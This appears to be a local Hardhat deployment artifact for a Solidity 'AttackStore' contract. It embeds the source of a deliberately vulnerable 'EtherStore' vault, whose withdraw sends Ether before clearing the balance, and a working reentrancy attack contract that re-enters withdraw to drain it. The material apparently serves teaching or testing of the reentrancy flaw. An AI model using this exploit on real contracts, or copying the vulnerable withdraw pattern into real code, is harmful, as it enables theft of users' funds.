{
  "address": "0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "transactionHash": "0xaccbca4bc2962452b0996880ad7cc0bd5508e3f61803227b8f037efb8d832e64",
  "receipt": {
    "to": null,
    "from": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "contractAddress": "0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9",
    "transactionIndex": 0,
    "gasUsed": "309212",
    "logsBloom": "0x
    "blockHash": "0x30d43619ac3c275bdff756410bf00ace763e720731cb295ff6fb8a44bf37266b",
    "transactionHash": "0xaccbca4bc2962452b0996880ad7cc0bd5508e3f61803227b8f037efb8d832e64",
    "logs": [],
    "blockNumber": 4,
    "cumulativeGasUsed": "309212",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0"
  ],
  "numDeployments": 1,
  "solcInputHash": "5f1a7fda2580569804eea86f4c51ab11",
  "metadata": "{\"compiler\":{\"version\":\"0.8.11+commit.d7f03943\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_etherStoreAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"etherStore\",\"outputs\":[{\"internalType\":\"contract EtherStore\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/AttackStore.sol\":\"AttackStore\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/AttackStore.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.11;\\n\\nimport \\\"./EtherStore.sol\\\";\\n\\ncontract AttackStore {\\n    EtherStore public etherStore;\\n\\n    constructor(address _etherStoreAddress) {\\n        etherStore = EtherStore(_etherStoreAddress);\\n    }\\n\\n    // Fallback or Recieve is called when EtherStore sends Ether to this contract.\\n    receive() external payable {\\n        if (address(etherStore).balance >= 1 ether) {\\n            etherStore.withdraw(10 ether);\\n        }\\n    }\\n\\n    function attack() external payable {\\n        require(msg.value >= 1 ether);\\n        etherStore.deposit{value: msg.value}();\\n        etherStore.withdraw(msg.value);\\n    }\\n\\n    // Helper function to check the balance of this contract\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\",\"keccak256\":\"0xe388b454c6d2064ac9680793892ccb77905af4face6b97e0f3896878b54c4981\",\"license\":\"MIT\"},\"contracts/EtherStore.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.11;\\n\\ncontract EtherStore {\\n    mapping(address => uint256) public balances;\\n\\n    function deposit() external payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    function withdraw(uint256 _amount) external {\\n        uint256 bal = balances[msg.sender];\\n        require(bal >= _amount);\\n\\n        (bool sent, ) = msg.sender.call{value: _amount}(\\\"\\\");\\n        require(sent, \\\"Failed to send Ether\\\");\\n\\n        balances[msg.sender] = 0;\\n    }\\n\\n    // Helper function to check the balance of this contract\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\",\"keccak256\":\"0xddfb04a271cdf88eb444043e854be2e1365fb68a024b955e358bb26626e29153\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b5060405161053e38038061053e833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610427806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe01461011e5780639e5faafc14610149578063acd2e6e51461015357610119565b3661011957670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101175760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d678ac7230489e800006040518263ffffffff1660e01b81526004016100e4919061031c565b600060405180830381600087803b1580156100fe57600080fd5b505af1158015610112573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012a57600080fd5b5061013361017e565b6040516101409190610346565b60405180910390f35b610151610186565b005b34801561015f57600080fd5b506101686102a9565b60405161017591906103d6565b60405180910390f35b600047905090565b670de0b6b3a764000034101561019b57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020357600080fd5b505af1158015610217573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016102759190610346565b600060405180830381600087803b15801561028f57600080fd5b505af11580156102a3573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b6000819050919050565b6000819050919050565b60006103066103016102fc846102cd565b6102e1565b6102d7565b9050919050565b610316816102eb565b82525050565b6000602082019050610331600083018461030d565b92915050565b610340816102d7565b82525050565b600060208201905061035b6000830184610337565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061039c61039761039284610361565b6102e1565b610361565b9050919050565b60006103ae82610381565b9050919050565b60006103c0826103a3565b9050919050565b6103d0816103b5565b82525050565b60006020820190506103eb60008301846103c7565b9291505056fea2646970667358221220f77531bdf2bdb12ddb5dee643233d8d36e7b374fa45697ef39af241559f3aab264736f6c634300080b0033",
  "deployedBytecode": "0x6080604052600436106100385760003560e01c806312065fe01461011e5780639e5faafc14610149578063acd2e6e51461015357610119565b3661011957670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101175760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d678ac7230489e800006040518263ffffffff1660e01b81526004016100e4919061031c565b600060405180830381600087803b1580156100fe57600080fd5b505af1158015610112573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012a57600080fd5b5061013361017e565b6040516101409190610346565b60405180910390f35b610151610186565b005b34801561015f57600080fd5b506101686102a9565b60405161017591906103d6565b60405180910390f35b600047905090565b670de0b6b3a764000034101561019b57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020357600080fd5b505af1158015610217573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016102759190610346565b600060405180830381600087803b15801561028f57600080fd5b505af11580156102a3573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b6000819050919050565b6000819050919050565b60006103066103016102fc846102cd565b6102e1565b6102d7565b9050919050565b610316816102eb565b82525050565b6000602082019050610331600083018461030d565b92915050565b610340816102d7565b82525050565b600060208201905061035b6000830184610337565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061039c61039761039284610361565b6102e1565b610361565b9050919050565b60006103ae82610381565b9050919050565b60006103c0826103a3565b9050919050565b6103d0816103b5565b82525050565b60006020820190506103eb60008301846103c7565b9291505056fea2646970667358221220f77531bdf2bdb12ddb5dee643233d8d36e7b374fa45697ef39af241559f3aab264736f6c634300080b0033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 5,
        "contract": "contracts/AttackStore.sol:AttackStore",
        "label": "etherStore",
        "offset": 0,
        "slot": "0",
        "type": "t_contract(EtherStore)147"
      }
    ],
    "types": {
      "t_contract(EtherStore)147": {
        "encoding": "inplace",
        "label": "contract EtherStore",
        "numberOfBytes": "20"
      }
    }
  }
}